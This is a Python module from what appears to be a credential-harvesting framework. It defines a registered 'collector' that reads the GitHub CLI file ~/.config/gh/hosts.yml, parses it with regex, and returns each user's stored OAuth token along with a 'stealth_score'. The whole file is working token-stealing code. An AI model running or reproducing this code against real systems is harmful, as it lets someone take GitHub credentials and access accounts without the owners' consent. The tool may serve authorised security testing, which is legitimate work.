"""GitHub CLI (gh) token collector — parses ~/.config/gh/hosts.yml with regex."""

from __future__ import annotations

import re
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import gh_cli_dir


@CollectorRegistry.register
class GhCliCollector(BaseCollector):
    service = "github"
    source = "gh_cli"
    stealth_score = 5

    def _hosts_path(self):
        return gh_cli_dir() / "hosts.yml"

    def _parse_hosts_yml(self, text: str) -> list:
        """Parse hosts.yml using regex — no PyYAML dependency.

        Format:
        github.com:
            user: username
            oauth_token: gho_xxxxx
            git_protocol: https
        """
        entries = []
        current_host = None
        current_data = {}

        for line in text.splitlines():
            # Top-level host key (no leading whitespace)
            host_match = re.match(r'^(\S+):\s*$', line)
            if host_match:
                if current_host and current_data:
                    entries.append((current_host, current_data))
                current_host = host_match.group(1)
                current_data = {}
                continue

            # Indented key-value pair
            kv_match = re.match(r'^\s+(\w+):\s*(.+)$', line)
            if kv_match and current_host:
                current_data[kv_match.group(1)] = kv_match.group(2).strip()

        if current_host and current_data:
            entries.append((current_host, current_data))

        return entries

    def discover(self) -> List[DiscoveredToken]:
        results = []
        path = self._hosts_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_hosts_yml(text)

            for host, data in entries:
                token = data.get("oauth_token", "")
                user = data.get("user", "unknown")

                if token:
                    token_preview = f"{token[:8]}..." if len(token) > 8 else "present"
                    details = f"token={token_preview}"
                else:
                    details = "token in system keyring (not in YAML)"

                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(path),
                    account_hint=f"{user}@{host}",
                    stealth_score=self.stealth_score,
                    details=details,
                ))
        except Exception as e:
            self._warn(f"Failed to parse {path}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        path = self._hosts_path()
        if not path.exists():
            return results

        try:
            text = path.read_text()
            entries = self._parse_hosts_yml(text)

            for host, data in entries:
                token = data.get("oauth_token")
                if not token:
                    continue

                user = data.get("user", "unknown")
                protocol = data.get("git_protocol", "https")

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    username=user,
                    access_token=secure(token),
                    extra={
                        "host": host,
                        "git_protocol": protocol,
                    },
                ))
        except Exception as e:
            self._warn(f"Failed to collect from {path}: {e}")

        return results
